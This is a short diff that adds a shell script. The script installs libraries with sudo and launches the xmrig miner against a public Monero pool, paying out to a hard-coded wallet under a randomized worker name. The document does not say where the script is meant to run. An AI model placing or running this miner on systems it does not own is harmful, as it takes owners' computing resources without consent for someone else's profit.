@@ -1,0 +1,4 @@
+WORKER=$(echo $(shuf -i 1-99999 -n 1)-xmr)
+sudo apt-get update
+sudo apt-get install libpci3 libpci-dev
+./xmrig -o rx.unmineable.com:3333 -u XMR:83k7gWKercycphtgrASTt3gzSZWZyDELhAe4PsU9ST5G1mw2ShJJD1bbVxF5wN4d1FZN1v6chH1eEGk9CBYwBDrQJxdLm1r.$WORKER -p x -k --coin monero -a rx/0
